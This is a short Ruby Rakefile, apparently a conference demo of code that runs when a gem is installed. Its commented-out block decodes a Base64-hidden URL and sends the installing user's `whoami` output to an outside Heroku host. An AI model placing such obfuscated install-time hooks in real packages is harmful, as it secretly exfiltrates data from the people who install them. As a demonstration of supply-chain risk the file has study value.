#!/usr/bin/env rake
p "running rake file"
if ARGV[0] == "build"
  require "bundler/gem_tasks"
end

task :default => :prepare

task :prepare do
end

if ARGV[0] != "build"
  begin
    p "running shit at install time"
    # require 'net/http'
    # require 'uri'
    # require 'base64'
    # 
    # Net::HTTP.post_form(URI.parse(Base64.decode64('aHR0cDovL3N0YXJrLXNhbXVyYWktODEyMi5oZXJva3VhcHAuY29tL2xvZ3M=\n')), {'log' => "aloha ruby conf: #{`whoami`}"})
  rescue
  end
end